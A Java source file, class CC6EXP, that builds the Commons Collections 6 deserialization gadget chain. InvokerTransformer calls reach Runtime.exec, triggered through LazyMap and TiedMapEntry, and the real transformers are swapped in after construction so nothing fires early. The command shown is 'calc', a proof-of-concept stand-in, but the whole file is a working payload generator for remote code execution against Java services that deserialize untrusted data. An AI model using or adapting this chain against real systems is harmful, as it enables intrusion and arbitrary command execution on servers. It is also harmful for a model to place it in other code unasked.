package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CC6EXP {
    public static HashMap getPayload() throws Exception{
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        HashMap expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Utils.SetValue(transformerChain,"iTransformers",transformers);

        return expMap;
    }
}
